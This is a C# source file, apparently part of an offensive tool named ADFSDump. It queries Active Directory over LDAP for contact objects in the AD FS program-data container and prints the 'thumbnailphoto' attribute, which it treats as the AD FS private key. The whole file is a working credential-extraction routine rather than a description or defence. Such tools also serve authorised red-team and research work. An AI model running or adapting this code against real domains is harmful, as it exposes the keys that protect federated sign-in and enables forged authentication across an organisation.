﻿using System;
using System.IO;
using System.DirectoryServices;
using System.Collections.Generic;
using System.Text;

namespace ADFSDump.ActiveDirectory
{
    public static class ADSearcher
    {
        private const string _ldapFilter = "(&(objectClass=contact)(!(cn=CryptoPolicy)))";

        public static void GetPrivKey(Dictionary<string,string> arguments)
        {
            string domain = "";
            string server = "";
            string searchString = "";
            if(arguments == null)
            {
                //no domain or server given, try to find it ourselves
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            }
            else
            {
                if(arguments.ContainsKey("/domain"))
                {
                    domain = arguments["/domain"];
                }
                if (arguments.ContainsKey("/server"))
                {
                    server = arguments["/server"];
                    searchString = string.Format("LDAP://{0}/", server);
                } else
                {
                    searchString = "LDAP://";
                }
            }

            Console.WriteLine("## Extracting Private Key from Active Directory Store");
            Console.WriteLine(string.Format("[-] Domain is {0}", domain));
            string[] domainParts = domain.Split('.');
            List<String> searchBase = new List<String>{ "CN=ADFS", "CN=Microsoft", "CN=Program Data" };
            foreach( string part in domainParts)
            {
                searchBase.Add(string.Format("DC={0}", part));
            }

            string ldap = String.Format("{0}{1}", searchString, string.Join(",", searchBase.ToArray()));

            try
            {
                using (DirectoryEntry entry = new DirectoryEntry(ldap))
                {
                    using (DirectorySearcher mySearcher = new DirectorySearcher(entry))
                    {
                        mySearcher.Filter = (_ldapFilter);
                        mySearcher.PropertiesToLoad.Add("thumbnailphoto");
                        foreach (SearchResult resEnt in mySearcher.FindAll())
                        {
                            byte[] privateKey = (byte[])resEnt.Properties["thumbnailphoto"][0];
                            string convertedPrivateKey = BitConverter.ToString(privateKey);
                            Console.WriteLine("[-] Private Key: {0}\r\n\r\n", convertedPrivateKey);
                        }

                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("!!! Exception getting private key: {0}", e);
            }
        }
    }
}
